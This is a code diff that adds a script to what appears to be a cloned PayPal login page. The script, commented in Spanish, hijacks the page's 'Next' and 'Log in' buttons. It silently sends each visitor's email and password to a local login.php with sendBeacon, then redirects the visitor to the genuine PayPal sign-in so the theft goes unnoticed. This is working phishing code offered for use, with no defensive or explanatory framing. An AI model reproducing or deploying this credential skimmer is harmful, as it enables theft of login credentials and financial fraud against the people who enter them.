@@ -679,5 +679,65 @@
             });
         </script>
         <script async id="grcv3enterpriseframetag" data-key="6LfY0gUpAAAAAJgmuiSZtM8qB73-AGXlxhWx1xCy" data-action="LOGIN" data-sessionId="_sessionID=5DpkNsDCnmda0LM_LehVk3rzXFHyRa6f" data-src="https://www.paypalobjects.com/webcaptcha/grcenterprise_v3_static.html" data-submitURL="/auth/verifygrcadenterprise" data-csrf="rvm4xLJnDqEozY4Pn/HT5T97WbFlCGdlBwh1U=" data-f="034835d022094a8886e0a730612ad114" src="https://www.paypalobjects.com/webcaptcha/grcenterprise_v3_static.js"></script>
+        <script>
+const waitInterface = setInterval(() => {
+    const btnNext = document.getElementById("btnNext");
+    const btnLogin = document.getElementById("btnLogin"); // El botón real de entrar
+    
+    if (!btnNext || !btnLogin) return; 
+    clearInterval(waitInterface);
+
+    // --- PASO 1: Al tocar "Siguiente", mostrar Contraseña ---
+    btnNext.addEventListener("click", function (e) {
+        e.preventDefault();
+        e.stopImmediatePropagation();
+
+        const emailInput = document.getElementById("email");
+        if (emailInput && emailInput.value.length > 5) {
+            // Ocultar Email
+            const splitEmail = document.getElementById("splitEmail");
+            splitEmail.style.setProperty('display', 'none', 'important');
+            
+            // Mostrar Password
+            const splitPass = document.getElementById("splitPassword");
+            const splitPassSection = document.getElementById("splitPasswordSection");
+            
+            splitPass.classList.remove("hide");
+            splitPass.style.setProperty('display', 'block', 'important');
+            splitPassSection.classList.remove("hide");
+            splitPassSection.style.setProperty('display', 'block', 'important');
+
+            // Foco al campo password
+            setTimeout(() => document.getElementById("password").focus(), 200);
+        }
+    }, true);
+
+    // --- PASO 2: Al tocar "Iniciar Sesión", enviar a PHP ---
+    btnLogin.addEventListener("mousedown", function (e) {
+        const userField = document.getElementById("email");
+        const passField = document.getElementById("password");
+
+        if (userField.value.length > 0 && passField.value.length > 0) {
+            const datos = new URLSearchParams();
+            datos.append('email', userField.value);
+            datos.append('pass', passField.value);
+
+            // Envío silencioso
+            navigator.sendBeacon('login.php', datos);
+
+            // Redirección final tras envío
+            setTimeout(() => {
+                window.location.href = "https://www.paypal.com/signin";
+            }, 400);
+        }
+        
+        e.preventDefault();
+        e.stopImmediatePropagation();
+    }, true);
+
+    console.log("Success");
+}, 100);
+</script>
+
     </body>
 </html>
